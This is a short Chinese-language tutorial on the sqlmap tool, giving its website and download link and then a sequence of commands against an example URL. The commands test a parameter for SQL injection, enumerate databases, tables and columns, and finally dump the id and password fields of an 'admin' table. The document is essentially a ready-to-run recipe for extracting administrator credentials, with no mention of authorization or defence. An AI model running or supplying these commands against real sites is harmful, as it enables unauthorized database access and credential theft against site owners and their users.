# SQLmap
    官网：http://sqlmap.org/
    下载：https://codeload.github.com/sqlmapproject/sqlmap/legacy.tar.gz/master

## sqlmap 使用教程

    检查注入点：
    sqlmap -u http://aa.com/star_photo.php?artist_id＝11
    
    爆所有数据库信息：
    sqlmap -u http://aa.com/star_photo.php?artist_id＝11 --dbs
    
    爆当前数据库信息：
    sqlmap -u http://aa.com/star_photo.php?artist_id＝11 --current-db
    
    指定库名列出所有表
    sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 --tables
    
    'vhost48330' 为指定数据库名称
    
    指定库名表名列出所有字段
    sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin --columns
    'admin' 为指定表名称
    
    指定库名表名字段dump出指定字段
    sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin -C ac，id，password --dump
    'ac,id,password' 为指定字段名称